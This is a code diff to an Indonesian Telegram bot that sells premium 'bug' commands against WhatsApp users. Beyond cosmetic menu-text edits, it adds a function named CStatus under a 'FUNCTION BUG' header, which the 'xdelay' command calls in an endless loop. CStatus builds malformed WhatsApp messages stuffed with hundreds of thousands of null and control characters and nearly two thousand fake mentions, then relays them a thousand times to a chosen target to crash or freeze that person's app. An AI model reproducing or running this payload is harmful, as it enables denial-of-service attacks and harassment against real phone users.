@@ -1327,15 +1327,15 @@ try {
 
   const menuMessage = `
 <blockquote><b>Olâa ${ctx.from.first_name}
-"Kamu bukan hanya cinta,
- tapi kamu segalanya"
 - ZORO</b></blockquote>
 <blockquote><b>〣Developer : @zoronotdev 
 〣Version : Gen 1 V1
 〣Kondisi Zoro : Mana Maghrib Nya
 〣Stats Premium : ${premiumStatus}  
 〣Stats Sender : ${senderStatus}  
-〣Cooldown : ${cooldownStatus} Second</b></blockquote>`;
+〣Cooldown : ${cooldownStatus} Second
+
+"Ingat Bro Puasa Bukan Hanya Sekedar Menahan Makan Dan Minum Tetapi Ada Arti Yang Berharga Di Dalam Puasa Ini"</b></blockquote>`;
 
   const keyboard = [
     [
@@ -1386,15 +1386,15 @@ bot.action('/start', async (ctx) => {
 
         const menuMessage = `
 <blockquote><b>Olâa ${ctx.from.first_name}
-"Kamu bukan hanya cinta,
- tapi kamu segalanya"
 - ZORO</b></blockquote>
-<blockquote><b>〣Developer : @ZORONOTDEV 
-〣Version : Gen 1 V2
-〣Kondisi ZORO : Kapan Maghrib
+<blockquote><b>〣Developer : @zoronotdev 
+〣Version : Gen 1 V1
+〣Kondisi Zoro : Mana Maghrib Nya
 〣Stats Premium : ${premiumStatus}  
 〣Stats Sender : ${senderStatus}  
-〣Cooldown : ${cooldownStatus} Second</b></blockquote>`;
+〣Cooldown : ${cooldownStatus} Second
+
+"Ingat Bro Puasa Bukan Hanya Sekedar Menahan Makan Dan Minum Tetapi Ada Arti Yang Berharga Di Dalam Puasa Ini"</b></blockquote>`;
 
         const keyboard = [
     [
@@ -4529,7 +4529,7 @@ bot.command("xdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
   );
 
   while (true) {
-  await functionmu(sock, target);
+  await CStatus(sock, target)
     await new Promise((r) => setTimeout(r, 1000));
   }
 
@@ -4558,5 +4558,97 @@ bot.command("xdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
 });
 
 //------------- FUNCTION BUG -------------//
+
+async function CStatus(sock, target) {
+    let msg =
+ generateWAMessageFromContent(target, {
+        interactiveResponseMessage: {
+            body: {
+                text: "\u0000".repeat(9000),
+                format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
+                version: 3
+            },
+            contextInfo: {
+                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
+                isForwarded: true,
+                forwardingScore: 7205,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: "120363395010254840@newsletter",
+                    newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
+                    serverMessageId: 1000,
+                    accessibilityText: "idk"
+                },
+                statusAttributionType: "RESHARED_FROM_MENTION",
+                contactVcard: true,
+                isSampled: true,
+                dissapearingMode: {
+                    initiator: target,
+                    initiatedByMe: true
+                },
+                expiration: Date.now()
+            },
+        }
+    }, {});
+
+    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
+        participant: { jid: target }
+    });
+    const msg1 = {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "X",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "address_message",
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                    entryPointConversionSource: "call_permission_request"
+                }
+            }
+        }
+    };
+
+    const msg2 = {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741,
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+    };
+
+    for (let i = 0; i < 1000; i++) {
+        const payload = generateWAMessageFromContent(target, msg1, msg2);
+
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: payload.message
+            }
+        }, { messageId: payload.key.id, participant: { jid: target } });
+
+        await sleep(1000);
+    }
+
+    await sock.relayMessage("status@broadcast", {
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target } }]
+            }]
+        }]
+    });
+}
+
 //-------------- END FUNCTION -------------//
 bot.launch();
